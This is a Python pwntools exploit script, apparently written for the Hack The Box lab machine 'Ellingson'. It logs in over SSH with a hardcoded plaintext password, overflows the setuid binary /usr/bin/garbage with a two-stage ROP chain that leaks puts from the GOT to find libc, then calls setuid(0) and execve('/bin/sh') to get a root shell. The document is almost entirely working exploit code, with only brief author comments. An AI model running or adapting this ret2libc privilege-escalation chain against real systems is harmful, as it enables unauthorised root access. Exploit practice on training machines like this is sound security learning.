from pwn import *
context(os="linux", arch="amd64")
s = ssh(host='Ellingson.htb',user='margo',password='iamgod$08')
p= s.process('/usr/bin/garbage')
#context.log_level = 'DEBUG'

garbage= ELF('garbage')
rop = ROP(garbage)
libc = ELF('libc_fromremote.so') #the libc used in the box(ldd /usr/bin/garbage)
junk = "A"*136

# we try to use rop from pwntools to found the leaked_put (real adresse) theses adrsses are static in the binary 
rop.puts(garbage.got['puts'])
rop.call(garbage.symbols['main'])
log.info('stage 1 ROP Chain :' + rop.dump())

payload= junk + str(rop)
p.recvuntil("password:")
p.sendline(payload)
p.recvuntil("denied.\n") 

leaked_puts = p.recv()[:6].strip().ljust(8, '\x00') # error take me a lot of time, i have a wrong leaked addresse cause , it take 8 byte and adresse was about 6 byte so i have to read just the first 6 bytes
log.success("Leaked puts@GLIBCL: "+ str(leaked_puts))
leaked_puts = u64(leaked_puts)

# stage 2 
libc.address  = leaked_puts - libc.symbols['puts']
rop2= ROP(libc)
rop2.call(libc.symbols['setuid'],[0]) #setuid(0)
rop2.call(libc.symbols['execve'], [next(libc.search('/bin/sh\x00')), 0, 0]) # execve("/bin/sh",Null,Null)
log.info('Stage 2 ROP cHAIN :\N'+rop2.dump())
payload = junk +str(rop2)
p.sendline(payload)
p.recvuntil("denied.")
p.interactive()
